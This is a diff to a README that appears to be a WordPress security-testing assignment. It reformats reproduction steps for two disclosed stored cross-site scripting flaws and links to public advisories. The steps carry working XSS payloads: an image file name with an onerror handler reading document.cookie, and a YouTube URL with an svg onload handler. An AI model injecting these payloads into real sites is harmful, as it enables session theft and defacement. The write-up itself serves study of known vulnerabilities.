@@ -38,8 +38,8 @@ Time spent: **12** hours spent in total
   - [X] GIF Walkthrough:
     ![image](https://user-images.githubusercontent.com/21352483/32157093-a22ea1d4-bd17-11e7-8032-0365992474e7.gif)
   - [X] Steps to recreate: 
-      add a new post
-      insert a image with file name cengizhansahinsumofpwn<img src=a onerror=alert(document.cookie)>.jpg
+      - add a new post
+      - insert a image with file name ```cengizhansahinsumofpwn<img src=a onerror=alert(document.cookie)>.jpg```
   - [X] Affected source code:
     - [Link 1](https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html)
     
@@ -52,7 +52,7 @@ Time spent: **12** hours spent in total
   ![youtube](https://user-images.githubusercontent.com/21352483/32157259-cac53f94-bd18-11e7-8ae4-c69b3d45e5c3.gif)
   - [X] Steps to recreate:
       create a new post with format video
-      insert https://youtube[.]com/watch?v=abc<svg onload=alert(1)> on the context
+      insert ```https://youtube[.]com/watch?v=abc<svg onload=alert(1)>``` on the context
       pubnish and view post
   - [X] Affected source code:
     - [Link 1](https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html)
